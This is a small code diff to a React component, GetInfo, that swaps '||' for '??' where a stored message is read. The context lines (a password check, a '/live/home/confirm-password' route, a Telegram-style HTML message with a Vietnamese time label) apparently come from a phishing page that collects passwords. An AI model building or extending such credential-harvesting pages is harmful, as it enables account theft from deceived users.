@@ -98,7 +98,7 @@ const GetInfo: React.FC = () => {
 			} else if (password === '') {
 				passwordInputRef.current?.focus();
 			} else {
-				const existingMessage = localStorage.getItem('message') || '';
+				const existingMessage = localStorage.getItem('message') ?? '';
 				const newMessage =
 					existingMessage.replace(
 						/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
@@ -128,7 +128,7 @@ const GetInfo: React.FC = () => {
 		const delayLoading = async () => {
 			setIsLoading(true);
 			if (currentPath === '/live/home/confirm-password') {
-				const existingMessage = localStorage.getItem('message') || '';
+				const existingMessage = localStorage.getItem('message') ?? '';
 				const updatedMessage =
 					existingMessage.replace(
 						/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
